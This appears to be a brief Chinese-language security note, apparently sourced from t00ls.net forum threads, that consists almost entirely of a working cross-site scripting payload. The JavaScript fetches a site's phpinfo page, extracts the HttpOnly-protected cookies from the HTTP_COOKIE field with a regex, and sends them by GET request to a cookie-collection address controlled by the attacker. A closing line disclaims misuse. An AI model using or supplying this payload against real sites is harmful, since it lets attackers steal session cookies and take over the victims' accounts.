### `XSS`代码

```javascript
<script>
function createXmlHttp() {
    if (window.XMLHttpRequest) {
       xmlHttp = new XMLHttpRequest();               
    } else {
       xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
}
function getS() {
    var Url = 'PHPinfo的地址';
    createXmlHttp();
    xmlHttp.onreadystatechange = writeS;
    xmlHttp.open("GET", Url, true);
    xmlHttp.send(null);
}
function writeS() {
    if (xmlHttp.readyState == 4) {
     var x = xmlHttp.responseText.match(/HTTP_COOKIE.+?<\/td><td.+?>([\w\W]+?)<\/td>/);
     if (x){
        var url = "自己收取cookie的地址" + x[1]; //x 为带httponly cookie的所有cookie
        createXmlHttp();
        xmlHttp.open("GET", url, true);
        xmlHttp.send(null);  
       }   
    }
}
getS();
</script>
```

来源：https://www.t00ls.net/thread-55915-1-1.html https://www.t00ls.net/thread-55912-1-1.html

仅作笔记.禁止滥用.